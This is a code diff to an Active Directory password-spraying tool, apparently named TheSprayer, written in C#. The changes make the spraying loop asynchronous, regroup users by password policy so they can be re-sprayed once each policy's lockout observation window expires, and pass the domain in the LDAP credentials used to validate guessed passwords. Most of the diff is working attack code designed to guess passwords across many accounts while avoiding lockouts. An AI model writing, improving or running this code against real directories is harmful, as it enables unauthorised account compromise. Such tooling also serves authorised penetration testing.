@@ -249,7 +249,7 @@ namespace TheSprayer.Services
             return !Convert.ToBoolean(userAccountControlValue & 0x0002);
         }
 
-        public void SprayPasswords(
+        public async void SprayPasswords(
     IEnumerable<string> passwords,
     IEnumerable<string> usersToSpray = null,
     int attemptsToLeave = 2,
@@ -325,12 +325,33 @@ namespace TheSprayer.Services
                         else
                         {
                             Console.WriteLine($"waiting {defaultPasswordPolicy.ObservationWindow} minutes before retrying to prevent lockout.");
-                            Thread.Sleep(TimeSpan.FromMinutes((int)(defaultPasswordPolicy.ObservationWindow + 0.5)));
+                            await Task.Delay(TimeSpan.FromMinutes((int)(defaultPasswordPolicy.ObservationWindow + 0.5)));
 
-                            foreach (var user in users.Where(u => u.PasswordPolicyName == "Default Password Policy" && !u.Disabled))
+                            // Regroup users by policy and re-add those whose observation window has passed
+                            filteredUsers.Clear();
+
+                            var policyMap = fineGrainedPasswordPolicies.ToDictionary(p => p.Name);
+                            policyMap["Default Password Policy"] = defaultPasswordPolicy;
+
+                            foreach (var group in users.Where(u => !u.Disabled).GroupBy(u => u.PasswordPolicyName))
                             {
-                                user.BadPasswordAttempts = 0;
-                                filteredUsers.Add(user);
+                                if (!policyMap.TryGetValue(group.Key, out var policy))
+                                {
+                                    continue;
+                                }
+
+                                foreach (var user in group)
+                                {
+                                    if (user.LastBadPasswordTime < DateTime.Now.AddMinutes(-policy.ObservationWindow))
+                                    {
+                                        user.BadPasswordAttempts = 0;
+                                    }
+
+                                    if (ShouldSprayUser(user, defaultPasswordPolicy, fineGrainedPasswordPolicies, attemptsToLeave))
+                                    {
+                                        filteredUsers.Add(user);
+                                    }
+                                }
                             }
                         }
                     }
@@ -469,7 +490,7 @@ namespace TheSprayer.Services
         public bool TryValidateCredentials(string username, string password)
         {
             using var connection = new LdapConnection(new LdapDirectoryIdentifier(_domainController, 389, false, false));
-            connection.Credential = new NetworkCredential(username, password);
+            connection.Credential = new NetworkCredential(username, password, _domain);
 
             try
             {
@@ -487,7 +508,7 @@ namespace TheSprayer.Services
             var connection = new LdapConnection(new LdapDirectoryIdentifier(_domainController, 389, false, false));
             if (!string.IsNullOrWhiteSpace(_domainUser) && !string.IsNullOrWhiteSpace(_domainUserPass))
             {
-                connection.Credential = new NetworkCredential(_domainUser, _domainUserPass);
+                connection.Credential = new NetworkCredential(_domainUser, _domainUserPass, _domain);
             }
             return connection;
         }
